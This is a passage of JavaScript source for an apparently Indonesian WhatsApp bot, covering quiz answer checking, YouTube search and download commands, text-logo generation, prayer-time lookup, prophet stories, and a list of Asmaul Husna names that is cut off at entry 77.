         kuis = true;
     jawabanya = userdb.jawaban
 jawabresya = text
   if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebaktebakan = false
delete tebaktebakan[m.sender.split('@')[0]]
} else if (jawabresya === jawabanya) {
await ptz.sendText(m.chat, '*`[ Tebak Tebakan ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebaktebakan = false
userdb.bits += 143
delete tebaktebakan[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
} catch (e) {
m.reply(util.format(e))
}
    } else if (userdb.tebakbendera === true) {
    kuis = true;
     jawabanyaa = userdb.jawaban
 jawabresyaa = text
   if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebakbendera = false
delete tebakbendera[m.sender.split('@')[0]]
} else if (jawabresyaa === jawabanyaa) {
await ptz.sendText(m.chat, '*`[ Tebak Bendera ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebakbendera = false
userdb.bits += 143
delete tebakbendera[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    } else if (userdb.tebakkimia === true) {
    kuis = true;
     jawabanyaaa = userdb.jawaban
 jawabresyaaa = text
   if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebakkimia = false
delete tebakkimia[m.sender.split('@')[0]]
} else if (jawabresyaaa === jawabanyaaa) {
await ptz.sendText(m.chat, '*`[ Tebak Kimia ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebakkimia = false
userdb.bits += 143
delete tebakkimia[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    
   } else if (userdb.tebaktekateki === true) {
   if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebaktekateki = false
delete tebaktekateki[m.sender.split('@')[0]]
} else if (text === userdb.jawaban) {
await ptz.sendText(m.chat, '*`[ Tebak Teka-Teki ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebaktekateki = false
userdb.bits += 143
delete tebaktekateki[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    } else if (userdb.tebaksusunkata === true) {
       if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebaksusunkata = false
delete tebaksusunkata[m.sender.split('@')[0]]
} else if (text === userdb.jawaban) {
await ptz.sendText(m.chat, '*`[ Tebak Susun Kata ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebaksusunkata = false
userdb.bits += 143
delete tebaksusunkata[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    } else if (userdb.tebaksiapaaku === true) {
     if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebaksiapaaku = false
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else if (text === userdb.jawaban) {
await ptz.sendText(m.chat, '*`[ Tebak Siapa Aku- ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebaksiapaaku = false
userdb.bits += 143
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    } else if (userdb.tebakasahotak === true) {
         if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.tebakasahotak = false
delete tebakasahotak[m.sender.split('@')[0]]
} else if (text === userdb.jawaban) {
await ptz.sendText(m.chat, '*`[ Tebak Asah Otak ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.tebakasahotak = false
userdb.bits += 143
delete tebakasahotak[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    } else if (userdb.kuismath === true) {
    if (text == "nyerah") {
await m.reply('*Anda Telah menyerah*')
userdb.kuismath = false
delete kuismath[m.sender.split('@')[0]]
} else if (text === userdb.jawaban) {
await ptz.sendText(m.chat, '*`[ Learn - Math ]`*\n\nJawaban Benar 🎉\n- mendapat 150 bits', m);    
userdb.kuismath = false
userdb.bits += 143
delete kuismath[m.sender.split('@')[0]]
} else {
m.reply('*Jawaban Salah!*')
}
    } else if (userdb.caklontong === true) {
    if (text === "nyerah") {
        await m.reply('*Anda Telah menyerah*');
         userdb.caklontong = false;
  delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
    } else if (text.replace(" ", "") === userdb.jawaban) {
        userdb.caklontong = false;
        userdb.bits += 143;
        await m.reply(`Selamat Jawaban Kamu Benar\n\nJawaban: ${text}`);
         delete caklontong[m.sender.split('@')[0]]
      delete caklontong_desk[m.sender.split('@')[0]]
    } else {
        m.reply("Jawaban Salah 🤦🏽‍♂️");
    }
    } else {
    }
    
    break;



case 'ytmp3': case 'youtubemp3': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=QfPtFMhjsi6Tccajwi7ow`
return downloadyt(text, "mp3") 
}
break
case 'ytmp4': case 'youtubemp4': {
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
return downloadyt(text, "mp4") 
}
break
case "youtubsearch": case "yts": 
if (!text) throw `Example : ${prefix + command} story wa anime`
let search = await yts(text)
let teks = '*YouTube Search*\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `•° No : ${no++}\n•° Type : ${i.type}\n•° Video ID : ${i.videoId}\n•° Title : ${i.title}\n•° Views : ${i.views}\n•° Duration : ${i.timestamp}\n•° Upload At : ${i.ago}\n•° Url : ${i.url}\n\n─────────────────\n\n`
}
ptz.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
break

case "ytplay": case "play": {
  if (!text) return m.reply("Apa yang kamu cari?");

async function handleCommandytplay(text) {
    let res;
    try {
        res = await yts(text);
    } catch (error) {
        throw new Error('Error fetching YouTube search results');
    }

    let vid = res.videos[0];
    if (!vid) throw new Error('Video not found, try reversing the title and author');

    let { title, description, thumbnail, videoId } = vid;
    const url = 'https://www.youtube.com/watch?v=' + videoId;

    let yt;
    try {
        yt = await youtubedl(url);
    } catch (error) {
        yt = await youtubedlv2(url);
    }

    const link = await yt.audio['128kbps'].download();

    let doc = {
        audio: {
            url: link
        },
        mimetype: 'audio/mpeg',
        ptt: true, 
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                mediaType: 2,
                mediaUrl: url,
                title: title,
                body: hariini,
                sourceUrl: url,
                thumbnail: await (await fetch(thumbnail)).buffer() 
            }
        }
    };

    return ptz.sendMessage(m.chat, doc, { quoted: m });
}


    try {
        await handleCommandytplay(text);
    } catch (error) {
        console.error(error);
    }
}
break;

    
         case 'kodebahasa':{
	let LANGUAGES = `
	*╭─❲ KODE BAHASA ❳*
	*│*
	*│▸* af: Afrikaans 
	*│▸* sq: Albanian
	*│▸* ar: Arabic
	*│▸* hy: Armenian
	*│▸* ca: Catalan 
	*│▸* zh: Chinese 
	*│▸* zh-cn: Chinese (Mandarin/China)
	*│▸* zh-tw: Chinese (Mandarin/Taiwan)
	*│▸* zh-yue: Chinese (Cantonese)
	*│▸* hr: Croatian
	*│▸* cs: Czech
	*│▸* da: Danish
	*│▸* nl: Dutch
	*│▸* en: English    
	*│▸* en-au: English (Australia)
	*│▸* en-uk: English (United Kingdom)
	*│▸* en-us: English (United States) 
	*│▸* eo: Esperanto 
	*│▸* fi: Finnish 
	*│▸* fr: French
	*│▸* de: German
	*│▸* el: Greek 
	*│▸* ht: Haitian Creole 
	*│▸* hi: Hindi 
	*│▸* hu: Hungarian 
	*│▸* is: Icelandic 
	*│▸* id: Indonesian 
	*│▸* it: Italian
	*│▸* ja: Japanese
	*│▸* ko: Korean
	*│▸* la: Latin
	*│▸* lv: Latvian
	*│▸* mk: Macedonian
	*│▸* no: Norwegian
	*│▸* pl: Polish
	*│▸* pt: Portuguese
	*│▸* pt-br: Portuguese (Brazil)
	*│▸* ro: Romanian
	*│▸* ru: Russian
	*│▸* sr: Serbian
	*│▸* sk: Slovak
	*│▸* es: Spanish 
	*│▸* es-es: Spanish (Spain)
	*│▸* es-us: Spanish (United States)
	*│▸* sw: Swahili
	*│▸* sv: Swedish
	*│▸* ta: Tamil
	*│▸* th: Thai
	*│▸* tr: Turkish
	*│▸* vi: Vietnamese 
	*│▸* cy: Welsh
	*│*
	*╰────────────•*`
	reply(LANGUAGES)
	}
	break
        
     //========// game



//==============//


case 'flaming1':{
if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&script=fluffy-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.botname}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: global.sourceurl
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
 case 'flaming2':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.botname}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: global.sourceurl
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
case 'flaming3':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.botname}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: global.sourceurl
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
case 'flaming4':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.botname}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: global.sourceurl
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
case 'flaming5':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.botname}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: global.sourceurl
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break
case 'flaming6':{

if (args.length == 0) return m.reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=0&backgroundColor=%23101820&text=${ini_txt}`
ptz.sendMessage(m.chat, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `${global.botname}`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: global.sourceurl
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => m.reply('Server sedang error coba lagi besok!'))

}
break        

        

//=================================// SILAMI, ku segel biar bagus 
        case "jadwalsholat": case "sholat":
try {
if (text === "") {
let data = await (await fetch("https://api.aladhan.com/v1/timingsByCity?city=Makassar&country=Indonesia&method=8")).json();
   let jadwalSholatMakasar = data.data.timings


Subuh = data.data.timings.Fajr

Dhuhr = data.data.timings.Dhuhr
 
Magrib =  data.data.timings.Maghrib

Isha = data.data.timings.Isha

Asar = data.data.timings.Asr

reply (`
*${m2}[ - J A D W A L - ]${m2}*

• *Dhuhr:* ${Dhuhr} 
• *Asr*: ${Asar}
-
• *Maghrib:* ${Magrib}
-
• *Isha:* ${Isha}
• *Subuh:* ${Subuh}

#makassar

*Note:* 

_Kamu bisa Lihat Timings Di kota Lain, Contoh: .jadwalsholat Yogyakarta_
`)
} else if (text === `${text}`) {
let data = await (await fetch(`https://api.aladhan.com/v1/timingsByCity?city=${text}&country=Indonesia&method=8`)).json();
   let jadwalSholatMakasar = data.data.timings


Subuh = data.data.timings.Fajr

Dhuhr = data.data.timings.Dhuhr
 
Magrib =  data.data.timings.Maghrib
Asar = data.data.timings.Asr
Isha = data.data.timings.Isha
reply (`
*${m2}[ - J A D W A L - ]${m2}*

• *Dhuhr:* ${Dhuhr} 
• *Asr*: ${Asar}
-
• *Maghrib:* ${Magrib}
-
• *Isha:* ${Isha}
• *Subuh:* ${Subuh}

#${text}

*Note:* 

_Kamu bisa Lihat Timings Di kota Lain, Contoh: .jadwalsholat Yogyakarta_
`)
}
} catch(err) {
m.reply("Web Error Coba lagi Dengan Kota Yg Berbeda.")
}
break

case 'kisahnabi': {
if (!text) return m.reply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return m.reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Tanggal Lahir :* ${kisah.thn_kelahiran}
*- Tempat Lahir :* ${kisah.tmp}
*- Usia :* ${kisah.usia}

*— — — — — — ${m2}[ K I S A H ]${m2} — — — — — —*

${kisah.description}`

m.reply(`${hasil}`)

}
break

case 'asmaulhusna': {
const contoh = `*Asmaul Husna*`
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
const asmaulhusna = [
{
index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
index: 18,
latin: "Al Fattaah",
arabic: "الْفَتَّاحُ",
translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
translation_en: "The Opener, the Victory Giver"
},
{
index: 19,
latin: "Al ‘Aliim",
arabic: "اَلْعَلِيْمُ",
translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
translation_en: "The All Knowing, the Omniscient"
},
{
index: 20,
latin: "Al Qaabidh",
arabic: "الْقَابِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
translation_en: "The Restrainer, the Straightener"
},
{
index: 21,
latin: "Al Baasith",
arabic: "الْبَاسِطُ",
translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
translation_en: "The Expander, the Munificent"
},
{
index: 22,
latin: "Al Khaafidh",
arabic: "الْخَافِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
translation_en: "The Abaser"
},
{
index: 23,
latin: "Ar Raafi’",
arabic: "الرَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
translation_en: "The Exalter"
},
{
index: 24,
latin: "Al Mu’izz",
arabic: "الْمُعِزُّ",
translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
translation_en: "The Giver of Honor"
},
{
index: 25,
latin: "Al Mudzil",
arabic: "المُذِلُّ",
translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
translation_en: "The Giver of Dishonor"
},
{
index: 26,
latin: "Al Samii’",
arabic: "السَّمِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
translation_en: "The All Hearing"
},
{
index: 27,
latin: "Al Bashiir",
arabic: "الْبَصِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
translation_en: "The All Seeing"
},
{
index: 28,
latin: "Al Hakam",
arabic: "الْحَكَمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
translation_en: "The Judge, the Arbitrator"
},
{
index: 29,
latin: "Al ‘Adl",
arabic: "الْعَدْلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Utterly Just"
},
{
index: 30,
latin: "Al Lathiif",
arabic: "اللَّطِيفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
translation_en: "The Subtly Kind"
},
{
index: 31,
latin: "Al Khabiir",
arabic: "الْخَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
translation_en: "The All Aware"
},
{
index: 32,
latin: "Al Haliim",
arabic: "الْحَلِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
translation_en: "The Forbearing, the Indulgent"
},
{
index: 33,
latin: "Al ‘Azhiim",
arabic: "الْعَظِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
translation_en: "The Magnificent, the Infinite"
},
{
index: 34,
latin: "Al Ghafuur",
arabic: "الْغَفُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
translation_en: "The All Forgiving"
},
{
index: 35,
latin: "As Syakuur",
arabic: "الشَّكُورُ",
translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
translation_en: "The Grateful"
},
{
index: 36,
latin: "Al ‘Aliy",
arabic: "الْعَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Sublimely Exalted"
},
{
index: 37,
latin: "Al Kabiir",
arabic: "الْكَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
translation_en: "The Great"
},
{
index: 38,
latin: "Al Hafizh",
arabic: "الْحَفِيظُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
translation_en: "The Preserver"
},
{
index: 39,
latin: "Al Muqiit",
arabic: "المُقيِت",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
translation_en: "The Nourisher"
},
{
index: 40,
latin: "Al Hasiib",
arabic: "الْحسِيبُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
translation_en: "The Reckoner"
},
{
index: 41,
latin: "Al Jaliil",
arabic: "الْجَلِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Majestic"
},
{
index: 42,
latin: "Al Kariim",
arabic: "الْكَرِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
translation_en: "The Bountiful, the Generous"
},
{
index: 43,
latin: "Ar Raqiib",
arabic: "الرَّقِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
translation_en: "The Watchful"
},
{
index: 44,
latin: "Al Mujiib",
arabic: "الْمُجِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
translation_en: "The Responsive, the Answerer"
},
{
index: 45,
latin: "Al Waasi’",
arabic: "الْوَاسِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
translation_en: "The Vast, the All Encompassing"
},
{
index: 46,
latin: "Al Hakiim",
arabic: "الْحَكِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
translation_en: "The Wise"
},
{
index: 47,
latin: "Al Waduud",
arabic: "الْوَدُودُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
translation_en: "The Loving, the Kind One"
},
{
index: 48,
latin: "Al Majiid",
arabic: "الْمَجِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The All Glorious"
},
{
index: 49,
latin: "Al Baa’its",
arabic: "الْبَاعِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
translation_en: "The Raiser of the Dead"
},
{
index: 50,
latin: "As Syahiid",
arabic: "الشَّهِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
translation_en: "The Witness"
},
{
index: 51,
latin: "Al Haqq",
arabic: "الْحَقُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
translation_en: "The Truth, the Real"
},
{
index: 52,
latin: "Al Wakiil",
arabic: "الْوَكِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
translation_en: "The Trustee, the Dependable"
},
{
index: 53,
latin: "Al Qawiyyu",
arabic: "الْقَوِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
translation_en: "The Strong"
},
{
index: 54,
latin: "Al Matiin",
arabic: "الْمَتِينُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
translation_en: "The Firm, the Steadfast"
},
{
index: 55,
latin: "Al Waliyy",
arabic: "الْوَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
translation_en: "The Protecting Friend, Patron, and Helper"
},
{
index: 56,
latin: "Al Hamiid",
arabic: "الْحَمِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
translation_en: "The All Praiseworthy"
},
{
index: 57,
latin: "Al Mushii",
arabic: "الْمُحْصِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
translation_en: "The Accounter, the Numberer of All"
},
{
index: 58,
latin: "Al Mubdi’",
arabic: "الْمُبْدِئُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
translation_en: "The Producer, Originator, and Initiator of all"
},
{
index: 59,
latin: "Al Mu’iid",
arabic: "الْمُعِيدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
translation_en: "The Reinstater Who Brings Back All"
},
{
index: 60,
latin: "Al Muhyii",
arabic: "الْمُحْيِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
translation_en: "The Giver of Life"
},
{
index: 61,
latin: "Al Mumiitu",
arabic: "اَلْمُمِيتُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
translation_en: "The Bringer of Death, the Destroyer"
},
{
index: 62,
latin: "Al Hayyu",
arabic: "الْحَيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
translation_en: "The Ever Living"
},
{
index: 63,
latin: "Al Qayyuum",
arabic: "الْقَيُّومُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
translation_en: "The Self Subsisting Sustainer of All"
},
{
index: 64,
latin: "Al Waajid",
arabic: "الْوَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
translation_en: "The Perceiver, the Finder, the Unfailing"
},
{
index: 65,
latin: "Al Maajid",
arabic: "الْمَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Illustrious, the Magnificent"
},
{
index: 66,
latin: "Al Wahiid",
arabic: "الْواحِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
translation_en: "The One, The Unique, Manifestation of Unity"
},
{
index: 67,
latin: "Al ‘Ahad",
arabic: "اَلاَحَدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
translation_en: "The One, the All Inclusive, the Indivisible"
},
{
index: 68,
latin: "As Shamad",
arabic: "الصَّمَدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
},
{
index: 69,
latin: "Al Qaadir",
arabic: "الْقَادِرُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
translation_en: "The All Able"
},
{
index: 70,
latin: "Al Muqtadir",
arabic: "الْمُقْتَدِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
translation_en: "The All Determiner, the Dominant"
},
{
index: 71,
latin: "Al Muqaddim",
arabic: "الْمُقَدِّمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
translation_en: "The Expediter, He who brings forward"
},
{
index: 72,
latin: "Al Mu’akkhir",
arabic: "الْمُؤَخِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
translation_en: "The Delayer, He who puts far away"
},
{
index: 73,
latin: "Al Awwal",
arabic: "الأوَّلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
translation_en: "The First"
},
{
index: 74,
latin: "Al Aakhir",
arabic: "الآخِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
translation_en: "The Last"
},
{
index: 75,
latin: "Az Zhaahir",
arabic: "الظَّاهِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
translation_en: "The Manifest; the All Victorious"
},
{
index: 76,
latin: "Al Baathin",
arabic: "الْبَاطِنُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
translation_en: "The Hidden; the All Encompassing"
},
{
index: 77,
latin: "Al Waali",
arabic: "الْوَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
